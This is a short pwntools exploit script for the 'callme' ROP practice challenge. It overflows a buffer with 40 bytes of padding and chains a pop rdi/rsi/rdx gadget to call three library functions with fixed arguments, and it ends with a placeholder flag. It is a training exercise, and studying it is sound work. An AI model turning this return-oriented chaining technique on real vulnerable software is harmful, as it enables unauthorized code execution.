from pwn import *
binf = ELF("callme")
libc = "libcallme.so"
#p = remote("chall.ctf.bamboofox.tw", 10102)
p=process('callme')

gs = '''
break *(&callme_one+30)
'''

def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)


context.log_level = "DEBUG"
#context.aslr = False
print(binf.plt)

p=start()
#pause()
callme_one=p64(0x400720)
callme_two=p64(0x400740)
callme_three=p64(0x4006f0)
gadget=p64(0x40093c) #pop rdi rsi rdx ret
param1=p64(0xdeadbeefdeadbeef)
param2=p64(0xcafebabecafebabe)
param3=p64(0xd00df00dd00df00d)
padd=b'A'*40
params=gadget+param1+param2+param3


p.sendafter("> ", padd+params+callme_one+params+callme_two+params+callme_three)


p.interactive()
#b'ROPE{a_placeholder_32byte_flag!}\n'
